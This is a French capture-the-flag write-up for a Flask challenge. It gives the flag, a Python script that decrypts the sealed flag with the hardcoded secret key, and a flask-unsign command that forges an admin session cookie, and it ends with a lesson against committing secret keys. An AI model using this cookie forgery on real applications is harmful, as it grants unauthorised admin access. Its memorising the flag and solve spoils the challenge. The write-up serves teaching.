# flask-unsign (web easy) — Flask session, creators: hibris, Clawd

**Flag : `NCTF{itsdangerous_secret_key_resign_admin_session}`**

## Énoncé
Members Panel Flask livré avec le source + un cookie de session guest capturé.
Routes : `GET /signup` (role=guest), `GET /admin/flag` (admins only). Rien n'est live.

## Clé en dur dans app.py
```
app.secret_key = "s3cr3t-flask-signing-key-do-not-share-8842"
```
Le flag est scellé dans `SEALED_FLAG_HEX` et déchiffré par `unseal_flag()` :
keystream = SHA256(secret_key + b"|panel-seal") étendu par compteur, puis XOR.

## Solve (offline, direct)
```python
import hashlib
secret="s3cr3t-flask-signing-key-do-not-share-8842"
SEALED="89008e3e14104f5680c3a3019d2bc222ab35396e916d5f4afa7773cfe11a83de5604021d700030cad2576ea6d522e02c81d3"
def ks(key,n):
    o=b"";c=0
    while len(o)<n: o+=hashlib.sha256(key+c.to_bytes(4,'big')).digest();c+=1
    return o[:n]
ct=bytes.fromhex(SEALED); key=hashlib.sha256(secret.encode()+b"|panel-seal").digest()
print(bytes(a^b for a,b in zip(ct,ks(key,len(ct)))).decode())
```

## Voie intended (forge cookie)
Cookie fourni = `{"uid":7,"role":"guest","display":"guest"}` (base64 avant le 1er point).
Avec la clé : re-signer un cookie role=admin et requêter /admin/flag :
```
flask-unsign --sign --secret 's3cr3t-flask-signing-key-do-not-share-8842' \
  --cookie "{'uid':7,'role':'admin','display':'admin'}"
```
(équivalent — le flag est de toute façon dérivable du source puisque la clé est connue).

## Leçon
Clé de signature Flask connue = on forge n'importe quelle session (itsdangerous).
Ne jamais hardcoder/committer `SECRET_KEY`.
